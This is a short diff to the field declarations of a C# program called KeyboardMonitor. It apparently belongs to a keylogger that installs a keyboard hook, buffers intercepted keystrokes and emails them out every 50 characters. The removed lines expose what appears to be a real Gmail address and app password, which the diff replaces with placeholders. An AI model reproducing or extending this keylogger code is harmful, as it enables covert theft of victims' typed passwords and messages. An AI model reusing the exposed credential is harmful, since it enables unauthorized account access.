@@ -12,8 +12,8 @@ namespace KeyboardMonitor
     class Program
     {
         // 1. المتغيرات العامة
-        private static string myEmail = "asamtasamt824@gmail.com";
-        private static string myAppPassword = "tsyglendrcihhklc";
+        private static string myEmail = "example@gmail.com";
+        private static string myAppPassword = "----------------";
         private static int sendEveryXCharacters = 50;
         private static IntPtr _hookID = IntPtr.Zero;
         private static string interceptedData = "";
